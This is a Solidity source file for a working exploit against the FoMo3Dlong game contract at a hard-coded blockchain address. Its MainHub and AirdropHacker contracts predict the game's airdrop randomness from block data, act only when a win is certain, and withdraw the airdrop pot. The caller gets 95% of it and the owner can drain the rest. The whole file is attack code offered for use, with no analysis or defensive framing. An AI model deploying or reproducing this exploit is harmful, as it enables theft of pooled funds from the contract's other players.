 

pragma solidity ^0.4.24;

 

contract FoMo3Dlong{
    uint256 public airDropPot_;
    uint256 public airDropTracker_;
    function withdraw() public;
    function buyXaddr(address _affCode, uint256 _team) public payable;
}

contract MainHub{
    using SafeMath for *;
    address public owner;
    bool public closed = false;
    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    
    modifier onlyOwner{
        require(msg.sender==owner);
        _;
    }
    
    modifier onlyNotClosed{
        require(!closed);
        _;
    }
    
    constructor() public payable{
        require(msg.value==.1 ether);
        owner = msg.sender;
    }
    
    function attack() public onlyNotClosed{
        require(code.airDropPot_()>=.5 ether);  
        require(airdrop());
        uint256 initialBalance = address(this).balance;
        (new AirdropHacker).value(.1 ether)();
        uint256 postBalance = address(this).balance;
        uint256 takenAmount = postBalance - initialBalance;
        msg.sender.transfer(takenAmount*95/100);  
        require(address(this).balance>=.1 ether); 
    }
    
    function airdrop() private view returns(bool)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
            (block.number)
            
        )));
        if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_()) 
            return(true);
        else
            return(false);
    }
    
    function drain() public onlyOwner{
        closed = true;
        owner.transfer(address(this).balance); 
    }
    function() public payable{}
}

contract AirdropHacker{
    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    constructor() public payable{
        code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2); 
        code.withdraw();
        require(address(this).balance>=.1 ether); 
        selfdestruct(msg.sender);
    }
    
    function() public payable{}
    
}

library SafeMath {
     
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

     
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
}